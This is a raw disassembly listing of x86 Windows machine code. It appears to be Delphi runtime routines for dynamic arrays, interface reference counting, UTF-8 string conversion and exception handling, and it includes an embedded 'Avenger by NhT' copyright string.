  402e2e:	8b c0                	mov    %eax,%eax
  402e30:	55                   	push   %ebp
  402e31:	8b ec                	mov    %esp,%ebp
  402e33:	83 c4 e0             	add    $0xffffffe0,%esp
  402e36:	53                   	push   %ebx
  402e37:	56                   	push   %esi
  402e38:	57                   	push   %edi
  402e39:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  402e3c:	8b f2                	mov    %edx,%esi
  402e3e:	89 45 fc             	mov    %eax,-0x4(%ebp)
  402e41:	8b 5d fc             	mov    -0x4(%ebp),%ebx
  402e44:	8b 1b                	mov    (%ebx),%ebx
  402e46:	8b 45 08             	mov    0x8(%ebp),%eax
  402e49:	8b 38                	mov    (%eax),%edi
  402e4b:	85 ff                	test   %edi,%edi
  402e4d:	7f 1a                	jg     0x402e69
  402e4f:	85 ff                	test   %edi,%edi
  402e51:	7d 07                	jge    0x402e5a
  402e53:	b0 04                	mov    $0x4,%al
  402e55:	e8 f2 e3 ff ff       	call   0x40124c
  402e5a:	8b 45 fc             	mov    -0x4(%ebp),%eax
  402e5d:	8b d6                	mov    %esi,%edx
  402e5f:	e8 c4 ff ff ff       	call   0x402e28
  402e64:	e9 4a 01 00 00       	jmp    0x402fb3
  402e69:	33 c0                	xor    %eax,%eax
  402e6b:	89 45 f0             	mov    %eax,-0x10(%ebp)
  402e6e:	85 db                	test   %ebx,%ebx
  402e70:	74 0b                	je     0x402e7d
  402e72:	83 eb 04             	sub    $0x4,%ebx
  402e75:	8b 03                	mov    (%ebx),%eax
  402e77:	89 45 f0             	mov    %eax,-0x10(%ebp)
  402e7a:	83 eb 04             	sub    $0x4,%ebx
  402e7d:	33 c0                	xor    %eax,%eax
  402e7f:	8a 46 01             	mov    0x1(%esi),%al
  402e82:	01 c6                	add    %eax,%esi
  402e84:	8b c6                	mov    %esi,%eax
  402e86:	8b 50 02             	mov    0x2(%eax),%edx
  402e89:	89 55 e8             	mov    %edx,-0x18(%ebp)
  402e8c:	8b 50 06             	mov    0x6(%eax),%edx
  402e8f:	85 d2                	test   %edx,%edx
  402e91:	74 04                	je     0x402e97
  402e93:	8b 32                	mov    (%edx),%esi
  402e95:	eb 02                	jmp    0x402e99
  402e97:	33 f6                	xor    %esi,%esi
  402e99:	8b c7                	mov    %edi,%eax
  402e9b:	f7 6d e8             	imull  -0x18(%ebp)
  402e9e:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  402ea1:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  402ea4:	99                   	cltd
  402ea5:	f7 ff                	idiv   %edi
  402ea7:	3b 45 e8             	cmp    -0x18(%ebp),%eax
  402eaa:	74 07                	je     0x402eb3
  402eac:	b0 04                	mov    $0x4,%al
  402eae:	e8 99 e3 ff ff       	call   0x40124c
  402eb3:	83 45 e4 08          	addl   $0x8,-0x1c(%ebp)
  402eb7:	85 db                	test   %ebx,%ebx
  402eb9:	74 05                	je     0x402ec0
  402ebb:	83 3b 01             	cmpl   $0x1,(%ebx)
  402ebe:	75 35                	jne    0x402ef5
  402ec0:	89 5d e0             	mov    %ebx,-0x20(%ebp)
  402ec3:	3b 7d f0             	cmp    -0x10(%ebp),%edi
  402ec6:	7d 1d                	jge    0x402ee5
  402ec8:	85 f6                	test   %esi,%esi
  402eca:	74 19                	je     0x402ee5
  402ecc:	8b c3                	mov    %ebx,%eax
  402ece:	83 c0 08             	add    $0x8,%eax
  402ed1:	8b d7                	mov    %edi,%edx
  402ed3:	0f af 55 e8          	imul   -0x18(%ebp),%edx
  402ed7:	03 c2                	add    %edx,%eax
  402ed9:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  402edc:	2b cf                	sub    %edi,%ecx
  402ede:	8b d6                	mov    %esi,%edx
  402ee0:	e8 3b ff ff ff       	call   0x402e20
  402ee5:	8d 45 e0             	lea    -0x20(%ebp),%eax
  402ee8:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  402eeb:	e8 b4 e2 ff ff       	call   0x4011a4
  402ef0:	8b 5d e0             	mov    -0x20(%ebp),%ebx
  402ef3:	eb 5e                	jmp    0x402f53
  402ef5:	ff 0b                	decl   (%ebx)
  402ef7:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  402efa:	e8 75 e2 ff ff       	call   0x401174
  402eff:	8b d8                	mov    %eax,%ebx
  402f01:	8b 45 f0             	mov    -0x10(%ebp),%eax
  402f04:	89 45 ec             	mov    %eax,-0x14(%ebp)
  402f07:	3b 7d ec             	cmp    -0x14(%ebp),%edi
  402f0a:	7d 03                	jge    0x402f0f
  402f0c:	89 7d ec             	mov    %edi,-0x14(%ebp)
  402f0f:	85 f6                	test   %esi,%esi
  402f11:	74 2a                	je     0x402f3d
  402f13:	8b 55 ec             	mov    -0x14(%ebp),%edx
  402f16:	0f af 55 e8          	imul   -0x18(%ebp),%edx
  402f1a:	8b c3                	mov    %ebx,%eax
  402f1c:	83 c0 08             	add    $0x8,%eax
  402f1f:	33 c9                	xor    %ecx,%ecx
  402f21:	e8 ee e4 ff ff       	call   0x401414
  402f26:	8b 45 ec             	mov    -0x14(%ebp),%eax
  402f29:	50                   	push   %eax
  402f2a:	8b 55 fc             	mov    -0x4(%ebp),%edx
  402f2d:	8b 12                	mov    (%edx),%edx
  402f2f:	8b c3                	mov    %ebx,%eax
  402f31:	83 c0 08             	add    $0x8,%eax
  402f34:	8b ce                	mov    %esi,%ecx
  402f36:	e8 d5 fe ff ff       	call   0x402e10
  402f3b:	eb 16                	jmp    0x402f53
  402f3d:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  402f40:	0f af 4d e8          	imul   -0x18(%ebp),%ecx
  402f44:	8b d3                	mov    %ebx,%edx
  402f46:	83 c2 08             	add    $0x8,%edx
  402f49:	8b 45 fc             	mov    -0x4(%ebp),%eax
  402f4c:	8b 00                	mov    (%eax),%eax
  402f4e:	e8 05 e3 ff ff       	call   0x401258
  402f53:	c7 03 01 00 00 00    	movl   $0x1,(%ebx)
  402f59:	83 c3 04             	add    $0x4,%ebx
  402f5c:	89 3b                	mov    %edi,(%ebx)
  402f5e:	83 c3 04             	add    $0x4,%ebx
  402f61:	8b d7                	mov    %edi,%edx
  402f63:	2b 55 f0             	sub    -0x10(%ebp),%edx
  402f66:	0f af 55 e8          	imul   -0x18(%ebp),%edx
  402f6a:	8b 45 e8             	mov    -0x18(%ebp),%eax
  402f6d:	0f af 45 f0          	imul   -0x10(%ebp),%eax
  402f71:	03 c3                	add    %ebx,%eax
  402f73:	33 c9                	xor    %ecx,%ecx
  402f75:	e8 9a e4 ff ff       	call   0x401414
  402f7a:	83 7d f8 01          	cmpl   $0x1,-0x8(%ebp)
  402f7e:	7e 2e                	jle    0x402fae
  402f80:	83 45 08 04          	addl   $0x4,0x8(%ebp)
  402f84:	ff 4d f8             	decl   -0x8(%ebp)
  402f87:	4f                   	dec    %edi
  402f88:	85 ff                	test   %edi,%edi
  402f8a:	7c 22                	jl     0x402fae
  402f8c:	47                   	inc    %edi
  402f8d:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%ebp)
  402f94:	8b 45 08             	mov    0x8(%ebp),%eax
  402f97:	50                   	push   %eax
  402f98:	8b 45 f4             	mov    -0xc(%ebp),%eax
  402f9b:	8d 04 83             	lea    (%ebx,%eax,4),%eax
  402f9e:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  402fa1:	8b d6                	mov    %esi,%edx
  402fa3:	e8 88 fe ff ff       	call   0x402e30
  402fa8:	ff 45 f4             	incl   -0xc(%ebp)
  402fab:	4f                   	dec    %edi
  402fac:	75 e6                	jne    0x402f94
  402fae:	8b 45 fc             	mov    -0x4(%ebp),%eax
  402fb1:	89 18                	mov    %ebx,(%eax)
  402fb3:	5f                   	pop    %edi
  402fb4:	5e                   	pop    %esi
  402fb5:	5b                   	pop    %ebx
  402fb6:	8b e5                	mov    %ebp,%esp
  402fb8:	5d                   	pop    %ebp
  402fb9:	c2 04 00             	ret    $0x4
  402fbc:	54                   	push   %esp
  402fbd:	83 04 24 04          	addl   $0x4,(%esp)
  402fc1:	e8 6a fe ff ff       	call   0x402e30
  402fc6:	c3                   	ret
  402fc7:	90                   	nop
  402fc8:	8b 08                	mov    (%eax),%ecx
  402fca:	85 c9                	test   %ecx,%ecx
  402fcc:	74 32                	je     0x403000
  402fce:	c7 00 00 00 00 00    	movl   $0x0,(%eax)
  402fd4:	ff 49 f8             	decl   -0x8(%ecx)
  402fd7:	75 27                	jne    0x403000
  402fd9:	50                   	push   %eax
  402fda:	89 c8                	mov    %ecx,%eax
  402fdc:	31 c9                	xor    %ecx,%ecx
  402fde:	8a 4a 01             	mov    0x1(%edx),%cl
  402fe1:	8b 54 11 06          	mov    0x6(%ecx,%edx,1),%edx
  402fe5:	85 d2                	test   %edx,%edx
  402fe7:	74 0e                	je     0x402ff7
  402fe9:	8b 48 fc             	mov    -0x4(%eax),%ecx
  402fec:	85 c9                	test   %ecx,%ecx
  402fee:	74 07                	je     0x402ff7
  402ff0:	8b 12                	mov    (%edx),%edx
  402ff2:	e8 2d f5 ff ff       	call   0x402524
  402ff7:	83 e8 08             	sub    $0x8,%eax
  402ffa:	e8 8d e1 ff ff       	call   0x40118c
  402fff:	58                   	pop    %eax
  403000:	c3                   	ret
  403001:	8d 40 00             	lea    0x0(%eax),%eax
  403004:	53                   	push   %ebx
  403005:	8b 18                	mov    (%eax),%ebx
  403007:	85 d2                	test   %edx,%edx
  403009:	74 03                	je     0x40300e
  40300b:	ff 42 f8             	incl   -0x8(%edx)
  40300e:	85 db                	test   %ebx,%ebx
  403010:	74 13                	je     0x403025
  403012:	ff 4b f8             	decl   -0x8(%ebx)
  403015:	75 0e                	jne    0x403025
  403017:	50                   	push   %eax
  403018:	52                   	push   %edx
  403019:	89 ca                	mov    %ecx,%edx
  40301b:	ff 43 f8             	incl   -0x8(%ebx)
  40301e:	e8 a5 ff ff ff       	call   0x402fc8
  403023:	5a                   	pop    %edx
  403024:	58                   	pop    %eax
  403025:	89 10                	mov    %edx,(%eax)
  403027:	5b                   	pop    %ebx
  403028:	c3                   	ret
  403029:	8d 40 00             	lea    0x0(%eax),%eax
  40302c:	85 c0                	test   %eax,%eax
  40302e:	74 03                	je     0x403033
  403030:	ff 40 f8             	incl   -0x8(%eax)
  403033:	c3                   	ret
  403034:	8b 15 14 d0 40 00    	mov    0x40d014,%edx
  40303a:	89 10                	mov    %edx,(%eax)
  40303c:	a3 14 d0 40 00       	mov    %eax,0x40d014
  403041:	c3                   	ret
  403042:	8b c0                	mov    %eax,%eax
  403044:	53                   	push   %ebx
  403045:	56                   	push   %esi
  403046:	8b f0                	mov    %eax,%esi
  403048:	8b 1d 18 d0 40 00    	mov    0x40d018,%ebx
  40304e:	85 db                	test   %ebx,%ebx
  403050:	74 0c                	je     0x40305e
  403052:	8b 46 04             	mov    0x4(%esi),%eax
  403055:	ff 53 04             	call   *0x4(%ebx)
  403058:	8b 1b                	mov    (%ebx),%ebx
  40305a:	85 db                	test   %ebx,%ebx
  40305c:	75 f4                	jne    0x403052
  40305e:	5e                   	pop    %esi
  40305f:	5b                   	pop    %ebx
  403060:	c3                   	ret
  403061:	8d 40 00             	lea    0x0(%eax),%eax
  403064:	8b 10                	mov    (%eax),%edx
  403066:	85 d2                	test   %edx,%edx
  403068:	74 0e                	je     0x403078
  40306a:	c7 00 00 00 00 00    	movl   $0x0,(%eax)
  403070:	50                   	push   %eax
  403071:	52                   	push   %edx
  403072:	8b 02                	mov    (%edx),%eax
  403074:	ff 50 08             	call   *0x8(%eax)
  403077:	58                   	pop    %eax
  403078:	c3                   	ret
  403079:	8d 40 00             	lea    0x0(%eax),%eax
  40307c:	85 d2                	test   %edx,%edx
  40307e:	74 19                	je     0x403099
  403080:	52                   	push   %edx
  403081:	50                   	push   %eax
  403082:	8b 02                	mov    (%edx),%eax
  403084:	52                   	push   %edx
  403085:	ff 50 04             	call   *0x4(%eax)
  403088:	58                   	pop    %eax
  403089:	8b 08                	mov    (%eax),%ecx
  40308b:	8f 00                	pop    (%eax)
  40308d:	85 c9                	test   %ecx,%ecx
  40308f:	75 01                	jne    0x403092
  403091:	c3                   	ret
  403092:	8b 01                	mov    (%ecx),%eax
  403094:	51                   	push   %ecx
  403095:	ff 50 08             	call   *0x8(%eax)
  403098:	c3                   	ret
  403099:	8b 08                	mov    (%eax),%ecx
  40309b:	85 c9                	test   %ecx,%ecx
  40309d:	89 10                	mov    %edx,(%eax)
  40309f:	74 06                	je     0x4030a7
  4030a1:	8b 01                	mov    (%ecx),%eax
  4030a3:	51                   	push   %ecx
  4030a4:	ff 50 08             	call   *0x8(%eax)
  4030a7:	c3                   	ret
  4030a8:	85 d2                	test   %edx,%edx
  4030aa:	0f 84 b4 ff ff ff    	je     0x403064
  4030b0:	50                   	push   %eax
  4030b1:	51                   	push   %ecx
  4030b2:	52                   	push   %edx
  4030b3:	8b 08                	mov    (%eax),%ecx
  4030b5:	85 c9                	test   %ecx,%ecx
  4030b7:	74 09                	je     0x4030c2
  4030b9:	51                   	push   %ecx
  4030ba:	8b 01                	mov    (%ecx),%eax
  4030bc:	ff 50 08             	call   *0x8(%eax)
  4030bf:	8b 14 24             	mov    (%esp),%edx
  4030c2:	8b 02                	mov    (%edx),%eax
  4030c4:	ff 10                	call   *(%eax)
  4030c6:	85 c0                	test   %eax,%eax
  4030c8:	74 07                	je     0x4030d1
  4030ca:	b0 17                	mov    $0x17,%al
  4030cc:	e9 7b e1 ff ff       	jmp    0x40124c
  4030d1:	c3                   	ret
  4030d2:	8b c0                	mov    %eax,%eax
  4030d4:	85 c0                	test   %eax,%eax
  4030d6:	74 06                	je     0x4030de
  4030d8:	50                   	push   %eax
  4030d9:	8b 00                	mov    (%eax),%eax
  4030db:	ff 50 04             	call   *0x4(%eax)
  4030de:	c3                   	ret
  4030df:	90                   	nop
  4030e0:	55                   	push   %ebp
  4030e1:	8b ec                	mov    %esp,%ebp
  4030e3:	83 c4 f8             	add    $0xfffffff8,%esp
  4030e6:	53                   	push   %ebx
  4030e7:	56                   	push   %esi
  4030e8:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  4030eb:	89 55 fc             	mov    %edx,-0x4(%ebp)
  4030ee:	33 d2                	xor    %edx,%edx
  4030f0:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  4030f4:	0f 84 b8 00 00 00    	je     0x4031b2
  4030fa:	33 f6                	xor    %esi,%esi
  4030fc:	33 c9                	xor    %ecx,%ecx
  4030fe:	85 c0                	test   %eax,%eax
  403100:	0f 84 87 00 00 00    	je     0x40318d
  403106:	eb 6c                	jmp    0x403174
  403108:	8b 55 f8             	mov    -0x8(%ebp),%edx
  40310b:	0f b7 14 4a          	movzwl (%edx,%ecx,2),%edx
  40310f:	41                   	inc    %ecx
  403110:	83 fa 7f             	cmp    $0x7f,%edx
  403113:	77 06                	ja     0x40311b
  403115:	88 14 30             	mov    %dl,(%eax,%esi,1)
  403118:	46                   	inc    %esi
  403119:	eb 59                	jmp    0x403174
  40311b:	81 fa ff 07 00 00    	cmp    $0x7ff,%edx
  403121:	76 31                	jbe    0x403154
  403123:	8d 5e 03             	lea    0x3(%esi),%ebx
  403126:	3b 5d fc             	cmp    -0x4(%ebp),%ebx
  403129:	77 53                	ja     0x40317e
  40312b:	8b da                	mov    %edx,%ebx
  40312d:	c1 eb 0c             	shr    $0xc,%ebx
  403130:	80 cb e0             	or     $0xe0,%bl
  403133:	88 1c 30             	mov    %bl,(%eax,%esi,1)
  403136:	8b da                	mov    %edx,%ebx
  403138:	c1 eb 06             	shr    $0x6,%ebx
  40313b:	80 e3 3f             	and    $0x3f,%bl
  40313e:	80 cb 80             	or     $0x80,%bl
  403141:	88 5c 30 01          	mov    %bl,0x1(%eax,%esi,1)
  403145:	80 e2 3f             	and    $0x3f,%dl
  403148:	80 ca 80             	or     $0x80,%dl
  40314b:	88 54 30 02          	mov    %dl,0x2(%eax,%esi,1)
  40314f:	83 c6 03             	add    $0x3,%esi
  403152:	eb 20                	jmp    0x403174
  403154:	8d 5e 02             	lea    0x2(%esi),%ebx
  403157:	3b 5d fc             	cmp    -0x4(%ebp),%ebx
  40315a:	77 22                	ja     0x40317e
  40315c:	8b da                	mov    %edx,%ebx
  40315e:	c1 eb 06             	shr    $0x6,%ebx
  403161:	80 cb c0             	or     $0xc0,%bl
  403164:	88 1c 30             	mov    %bl,(%eax,%esi,1)
  403167:	80 e2 3f             	and    $0x3f,%dl
  40316a:	80 ca 80             	or     $0x80,%dl
  40316d:	88 54 30 01          	mov    %dl,0x1(%eax,%esi,1)
  403171:	83 c6 02             	add    $0x2,%esi
  403174:	3b 4d 08             	cmp    0x8(%ebp),%ecx
  403177:	73 05                	jae    0x40317e
  403179:	3b 75 fc             	cmp    -0x4(%ebp),%esi
  40317c:	72 8a                	jb     0x403108
  40317e:	3b 75 fc             	cmp    -0x4(%ebp),%esi
  403181:	72 04                	jb     0x403187
  403183:	8b 75 fc             	mov    -0x4(%ebp),%esi
  403186:	4e                   	dec    %esi
  403187:	c6 04 30 00          	movb   $0x0,(%eax,%esi,1)
  40318b:	eb 22                	jmp    0x4031af
  40318d:	3b 4d 08             	cmp    0x8(%ebp),%ecx
  403190:	73 1d                	jae    0x4031af
  403192:	8b 45 f8             	mov    -0x8(%ebp),%eax
  403195:	0f b7 14 48          	movzwl (%eax,%ecx,2),%edx
  403199:	41                   	inc    %ecx
  40319a:	83 fa 7f             	cmp    $0x7f,%edx
  40319d:	76 0a                	jbe    0x4031a9
  40319f:	81 fa ff 07 00 00    	cmp    $0x7ff,%edx
  4031a5:	76 01                	jbe    0x4031a8
  4031a7:	46                   	inc    %esi
  4031a8:	46                   	inc    %esi
  4031a9:	46                   	inc    %esi
  4031aa:	3b 4d 08             	cmp    0x8(%ebp),%ecx
  4031ad:	72 e3                	jb     0x403192
  4031af:	8d 56 01             	lea    0x1(%esi),%edx
  4031b2:	8b c2                	mov    %edx,%eax
  4031b4:	5e                   	pop    %esi
  4031b5:	5b                   	pop    %ebx
  4031b6:	59                   	pop    %ecx
  4031b7:	59                   	pop    %ecx
  4031b8:	5d                   	pop    %ebp
  4031b9:	c2 04 00             	ret    $0x4
  4031bc:	55                   	push   %ebp
  4031bd:	8b ec                	mov    %esp,%ebp
  4031bf:	6a 00                	push   $0x0
  4031c1:	53                   	push   %ebx
  4031c2:	56                   	push   %esi
  4031c3:	8b f2                	mov    %edx,%esi
  4031c5:	8b d8                	mov    %eax,%ebx
  4031c7:	33 c0                	xor    %eax,%eax
  4031c9:	55                   	push   %ebp
  4031ca:	68 5b 32 40 00       	push   $0x40325b
  4031cf:	64 ff 30             	push   %fs:(%eax)
  4031d2:	64 89 20             	mov    %esp,%fs:(%eax)
  4031d5:	8b c6                	mov    %esi,%eax
  4031d7:	e8 e4 e8 ff ff       	call   0x401ac0
  4031dc:	8b c3                	mov    %ebx,%eax
  4031de:	33 d2                	xor    %edx,%edx
  4031e0:	e8 e3 f0 ff ff       	call   0x4022c8
  4031e5:	74 5e                	je     0x403245
  4031e7:	8b c3                	mov    %ebx,%eax
  4031e9:	e8 86 f0 ff ff       	call   0x402274
  4031ee:	8d 14 40             	lea    (%eax,%eax,2),%edx
  4031f1:	8d 45 fc             	lea    -0x4(%ebp),%eax
  4031f4:	e8 7b ee ff ff       	call   0x402074
  4031f9:	8b c3                	mov    %ebx,%eax
  4031fb:	e8 74 f0 ff ff       	call   0x402274
  403200:	50                   	push   %eax
  403201:	8b 45 fc             	mov    -0x4(%ebp),%eax
  403204:	e8 47 eb ff ff       	call   0x401d50
  403209:	40                   	inc    %eax
  40320a:	50                   	push   %eax
  40320b:	8b c3                	mov    %ebx,%eax
  40320d:	e8 52 f0 ff ff       	call   0x402264
  403212:	50                   	push   %eax
  403213:	8b 45 fc             	mov    -0x4(%ebp),%eax
  403216:	e8 2d ed ff ff       	call   0x401f48
  40321b:	59                   	pop    %ecx
  40321c:	5a                   	pop    %edx
  40321d:	e8 be fe ff ff       	call   0x4030e0
  403222:	85 c0                	test   %eax,%eax
  403224:	7e 0d                	jle    0x403233
  403226:	8b d0                	mov    %eax,%edx
  403228:	4a                   	dec    %edx
  403229:	8d 45 fc             	lea    -0x4(%ebp),%eax
  40322c:	e8 43 ee ff ff       	call   0x402074
  403231:	eb 08                	jmp    0x40323b
  403233:	8d 45 fc             	lea    -0x4(%ebp),%eax
  403236:	e8 85 e8 ff ff       	call   0x401ac0
  40323b:	8b c6                	mov    %esi,%eax
  40323d:	8b 55 fc             	mov    -0x4(%ebp),%edx
  403240:	e8 cf e8 ff ff       	call   0x401b14
  403245:	33 c0                	xor    %eax,%eax
  403247:	5a                   	pop    %edx
  403248:	59                   	pop    %ecx
  403249:	59                   	pop    %ecx
  40324a:	64 89 10             	mov    %edx,%fs:(%eax)
  40324d:	68 62 32 40 00       	push   $0x403262
  403252:	8d 45 fc             	lea    -0x4(%ebp),%eax
  403255:	e8 66 e8 ff ff       	call   0x401ac0
  40325a:	c3                   	ret
  40325b:	e9 ac e5 ff ff       	jmp    0x40180c
  403260:	eb f0                	jmp    0x403252
  403262:	5e                   	pop    %esi
  403263:	5b                   	pop    %ebx
  403264:	59                   	pop    %ecx
  403265:	5d                   	pop    %ebp
  403266:	c3                   	ret
  403267:	90                   	nop
  403268:	55                   	push   %ebp
  403269:	8b ec                	mov    %esp,%ebp
  40326b:	6a 00                	push   $0x0
  40326d:	53                   	push   %ebx
  40326e:	56                   	push   %esi
  40326f:	8b f2                	mov    %edx,%esi
  403271:	8b d8                	mov    %eax,%ebx
  403273:	33 c0                	xor    %eax,%eax
  403275:	55                   	push   %ebp
  403276:	68 ab 32 40 00       	push   $0x4032ab
  40327b:	64 ff 30             	push   %fs:(%eax)
  40327e:	64 89 20             	mov    %esp,%fs:(%eax)
  403281:	8d 45 fc             	lea    -0x4(%ebp),%eax
  403284:	8b d3                	mov    %ebx,%edx
  403286:	e8 c9 ef ff ff       	call   0x402254
  40328b:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40328e:	8b d6                	mov    %esi,%edx
  403290:	e8 27 ff ff ff       	call   0x4031bc
  403295:	33 c0                	xor    %eax,%eax
  403297:	5a                   	pop    %edx
  403298:	59                   	pop    %ecx
  403299:	59                   	pop    %ecx
  40329a:	64 89 10             	mov    %edx,%fs:(%eax)
  40329d:	68 b2 32 40 00       	push   $0x4032b2
  4032a2:	8d 45 fc             	lea    -0x4(%ebp),%eax
  4032a5:	e8 5e ee ff ff       	call   0x402108
  4032aa:	c3                   	ret
  4032ab:	e9 5c e5 ff ff       	jmp    0x40180c
  4032b0:	eb f0                	jmp    0x4032a2
  4032b2:	5e                   	pop    %esi
  4032b3:	5b                   	pop    %ebx
  4032b4:	59                   	pop    %ecx
  4032b5:	5d                   	pop    %ebp
  4032b6:	c3                   	ret
  4032b7:	90                   	nop
  4032b8:	55                   	push   %ebp
  4032b9:	8b ec                	mov    %esp,%ebp
  4032bb:	33 c0                	xor    %eax,%eax
  4032bd:	55                   	push   %ebp
  4032be:	68 eb 32 40 00       	push   $0x4032eb
  4032c3:	64 ff 30             	push   %fs:(%eax)
  4032c6:	64 89 20             	mov    %esp,%fs:(%eax)
  4032c9:	ff 05 8c e5 40 00    	incl   0x40e58c
  4032cf:	75 0c                	jne    0x4032dd
  4032d1:	ff 15 6c d0 40 00    	call   *0x40d06c
  4032d7:	ff 15 38 d0 40 00    	call   *0x40d038
  4032dd:	33 c0                	xor    %eax,%eax
  4032df:	5a                   	pop    %edx
  4032e0:	59                   	pop    %ecx
  4032e1:	59                   	pop    %ecx
  4032e2:	64 89 10             	mov    %edx,%fs:(%eax)
  4032e5:	68 f2 32 40 00       	push   $0x4032f2
  4032ea:	c3                   	ret
  4032eb:	e9 1c e5 ff ff       	jmp    0x40180c
  4032f0:	eb f8                	jmp    0x4032ea
  4032f2:	5d                   	pop    %ebp
  4032f3:	c3                   	ret
  4032f4:	83 2d 8c e5 40 00 01 	subl   $0x1,0x40e58c
  4032fb:	73 3e                	jae    0x40333b
  4032fd:	e8 72 dd ff ff       	call   0x401074
  403302:	a3 90 e5 40 00       	mov    %eax,0x40e590
  403307:	c7 05 00 e0 40 00 dc 	movl   $0x4029dc,0x40e000
  40330e:	29 40 00 
  403311:	66 c7 05 2c e0 40 00 	movw   $0xd7b0,0x40e02c
  403318:	b0 d7 
  40331a:	66 c7 05 f8 e1 40 00 	movw   $0xd7b0,0x40e1f8
  403321:	b0 d7 
  403323:	66 c7 05 c4 e3 40 00 	movw   $0xd7b0,0x40e3c4
  40332a:	b0 d7 
  40332c:	e8 6b f6 ff ff       	call   0x40299c
  403331:	e8 e6 dd ff ff       	call   0x40111c
  403336:	a3 1c e0 40 00       	mov    %eax,0x40e01c
  40333b:	c3                   	ret
  40333c:	ff                   	(bad)
  40333d:	ff                   	(bad)
  40333e:	ff                   	(bad)
  40333f:	ff 2f                	ljmp   *(%edi)
  403341:	00 00                	add    %al,(%eax)
  403343:	00 50 6f             	add    %dl,0x6f(%eax)
  403346:	72 74                	jb     0x4033bc
  403348:	69 6f 6e 73 20 43 6f 	imul   $0x6f432073,0x6e(%edi),%ebp
  40334f:	70 79                	jo     0x4033ca
  403351:	72 69                	jb     0x4033bc
  403353:	67 68 74 20 28 63    	addr16 push $0x63282074
  403359:	29 20                	sub    %esp,(%eax)
  40335b:	31 39                	xor    %edi,(%ecx)
  40335d:	39 39                	cmp    %edi,(%ecx)
  40335f:	2c 32                	sub    $0x32,%al
  403361:	30 30                	xor    %dh,(%eax)
  403363:	33 20                	xor    (%eax),%esp
  403365:	41                   	inc    %ecx
  403366:	76 65                	jbe    0x4033cd
  403368:	6e                   	outsb  %ds:(%esi),(%dx)
  403369:	67 65 72 20          	addr16 gs jb 0x40338d
  40336d:	62 79 20             	bound  %edi,0x20(%ecx)
  403370:	4e                   	dec    %esi
  403371:	68 54 00 50 6a       	push   $0x6a500054
  403376:	40                   	inc    %eax
  403377:	e8 30 dd ff ff       	call   0x4010ac
  40337c:	c3                   	ret
  40337d:	8d 40 00             	lea    0x0(%eax),%eax
  403380:	b8 08 00 00 00       	mov    $0x8,%eax
  403385:	c3                   	ret
  403386:	8b c0                	mov    %eax,%eax
  403388:	53                   	push   %ebx
  403389:	e8 f2 ff ff ff       	call   0x403380
  40338e:	8b d8                	mov    %eax,%ebx
  403390:	85 db                	test   %ebx,%ebx
  403392:	74 36                	je     0x4033ca
  403394:	83 3d 74 d0 40 00 ff 	cmpl   $0xffffffff,0x40d074
  40339b:	75 0a                	jne    0x4033a7
  40339d:	b8 e2 00 00 00       	mov    $0xe2,%eax
  4033a2:	e8 0d e7 ff ff       	call   0x401ab4
  4033a7:	8b c3                	mov    %ebx,%eax
  4033a9:	e8 c6 ff ff ff       	call   0x403374
  4033ae:	85 c0                	test   %eax,%eax
  4033b0:	75 0c                	jne    0x4033be
  4033b2:	b8 e2 00 00 00       	mov    $0xe2,%eax
  4033b7:	e8 f8 e6 ff ff       	call   0x401ab4
  4033bc:	eb 0c                	jmp    0x4033ca
  4033be:	50                   	push   %eax
  4033bf:	a1 74 d0 40 00       	mov    0x40d074,%eax
  4033c4:	50                   	push   %eax
  4033c5:	e8 f2 dc ff ff       	call   0x4010bc
  4033ca:	5b                   	pop    %ebx
  4033cb:	c3                   	ret
  4033cc:	8a 0d 6c e6 40 00    	mov    0x40e66c,%cl
  4033d2:	a1 74 d0 40 00       	mov    0x40d074,%eax
  4033d7:	84 c9                	test   %cl,%cl
  4033d9:	75 26                	jne    0x403401
  4033db:	64 8b 15 2c 00 00 00 	mov    %fs:0x2c,%edx
  4033e2:	8b 04 82             	mov    (%edx,%eax,4),%eax
  4033e5:	c3                   	ret
  4033e6:	e8 9d ff ff ff       	call   0x403388
  4033eb:	a1 74 d0 40 00       	mov    0x40d074,%eax
  4033f0:	50                   	push   %eax
  4033f1:	e8 be dc ff ff       	call   0x4010b4
  4033f6:	85 c0                	test   %eax,%eax
  4033f8:	74 01                	je     0x4033fb
  4033fa:	c3                   	ret
  4033fb:	a1 78 e6 40 00       	mov    0x40e678,%eax
  403400:	c3                   	ret
  403401:	50                   	push   %eax
  403402:	e8 ad dc ff ff       	call   0x4010b4
  403407:	85 c0                	test   %eax,%eax
  403409:	74 db                	je     0x4033e6
  40340b:	c3                   	ret
  40340c:	b8 78 d0 40 00       	mov    $0x40d078,%eax
  403411:	e8 1e fc ff ff       	call   0x403034
  403416:	c3                   	ret
  403417:	90                   	nop
  403418:	53                   	push   %ebx
  403419:	8b d8                	mov    %eax,%ebx
  40341b:	33 c0                	xor    %eax,%eax
  40341d:	a3 74 d0 40 00       	mov    %eax,0x40d074
  403422:	6a 00                	push   $0x0
  403424:	e8 7b dc ff ff       	call   0x4010a4
  403429:	a3 70 e6 40 00       	mov    %eax,0x40e670
  40342e:	a1 70 e6 40 00       	mov    0x40e670,%eax
  403433:	a3 7c d0 40 00       	mov    %eax,0x40d07c
  403438:	33 c0                	xor    %eax,%eax
  40343a:	a3 80 d0 40 00       	mov    %eax,0x40d080
  40343f:	33 c0                	xor    %eax,%eax
  403441:	a3 84 d0 40 00       	mov    %eax,0x40d084
  403446:	e8 c1 ff ff ff       	call   0x40340c
  40344b:	ba 78 d0 40 00       	mov    $0x40d078,%edx
  403450:	8b c3                	mov    %ebx,%eax
  403452:	e8 15 e5 ff ff       	call   0x40196c
  403457:	5b                   	pop    %ebx
  403458:	c3                   	ret
  403459:	8d 40 00             	lea    0x0(%eax),%eax
  40345c:	55                   	push   %ebp
  40345d:	8b ec                	mov    %esp,%ebp
  40345f:	33 c0                	xor    %eax,%eax
  403461:	55                   	push   %ebp
  403462:	68 8d 34 40 00       	push   $0x40348d
  403467:	64 ff 30             	push   %fs:(%eax)
